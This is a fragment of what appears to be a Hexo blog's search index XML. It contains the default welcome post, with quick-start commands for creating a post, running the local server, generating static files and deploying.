        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
